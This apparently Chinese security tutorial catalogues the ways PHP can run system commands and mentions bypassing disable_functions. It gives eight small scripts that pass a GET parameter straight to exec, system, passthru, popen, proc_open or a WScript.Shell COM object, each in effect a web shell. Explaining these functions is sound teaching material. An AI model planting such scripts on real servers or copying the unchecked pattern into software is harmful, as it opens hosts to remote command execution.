在PHP中，执行系统命令，有以下方式或方法：
Default
exec()
shell_exec()
`whoami`
system()
passthru()
popen()
proc_open()
pcntl_exec() ：需要开启pcntl扩展
COM组件：Wscript.Shell和Shell.Application
dl()：通过加载自定义php扩展突破 disable_fucnitons指令的限制
利用PHP内核变量绕过disable_functions，传送门：利用PHP内核变量绕过disable_functions（附完整代码）

1、exec()

该函数默认返回值是执行结果的第一行，并不会有全部的执行结果。如果要打印执行结果，需遍历打印output数组。
Default
string exec ( string command, array &output, int &return_var)
command参数是要执行的命令
output数组是保存输出结果
return_var整形用来保存命令执行后的状态码，0代表执行成功，1代表执行失败
 
 
<?php
  $command=$_GET['command'];
  $ret=exec($command,$output,$a);
  echo $ret;          #默认只返回第一行结果
  echo "<br>";
  echo "****************************************************";
  echo "<br>";
  echo "Status: ",$a;      #打印出执行状态码
  echo "<br>";
  echo "****************************************************";
  $length=count($output);    #数组的长度
  for($i=0;$i<$length;$i++){
    echo $output[$i];
    echo "<br>";
  }
?>

2、shell_exec()
Default
<?php
  $command=$_GET['command'];
  $ret=shell_exec($command);
  echo $ret;
?>

3、system()
Default
system()
system(string command , int & return_var)
command参数是要执行的命令，
return_var参数存放返回的值，可不写该参数
 
 
<?php
  $command=$_GET['command'];
  $ret=system($command);
  echo $ret;
?>

4、$command
Default
<?php
  $command=$_GET['command'];
  $ret=`$command`;
  echo $ret;
?>

5、passthru()
Default
<?php
  $command=$_GET['command'];
  passthru($command);
?>

6、popen()
Default
popen ( string command, string mode )
打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。
返回一个和 fopen() 所返回的相同的文件指针，只不过它是单向的（只能用于读或写
）并且必须用 pclose() 来关闭。此指针可以用于 fgets()，fgetss() 和 fwrite()。
 
 
<?php
  $command=$_GET['command'];
  $fd = popen($command, 'r'); 
  while($s=fgets($fd)){
    print_r($s);
  }
?>

7、proc_open()
Default
resource proc_open ( string cmd, array descriptorspec, array &pipes [, string cwd [, array env [, array other_options]]] )
 
<?php
  $command=$_GET['command'];
    $descriptorspec=array( 
        0=>array('pipe','r'), 
        1=>array('pipe','w'),
        2=>array('pipe','w') 
    );
    $handle=proc_open($command,$descriptorspec,$pipes,NULL);
    if(!is_resource($handle)){
      die('proc_open failed');
    }
    while($s=fgets($pipes[1])){
      print_r($s);
    }
    while($s=fgets($pipes[2])){
      print_r($s);
    }
    fclose($pipes[0]);
    fclose($pipes[1]);
    fclose($pipes[2]);
    proc_close($handle);
?>

8、COM组件

php>5.4版本需手动添加该扩展
在php.ini文件中，加入如下这行
extension=php_com_dotnet.dll
然后查看phpinfo，该扩展是否enable。
enable之后，就可以使用如下脚本了。
Default
<?php
$command=$_GET['cmd'];
$wsh = new COM('WScript.shell');
$exec = $wsh->exec("cmd /c ".$command);
$stdout = $exec->StdOut();
$stroutput = $stdout->ReadAll();
echo $stroutput;
?>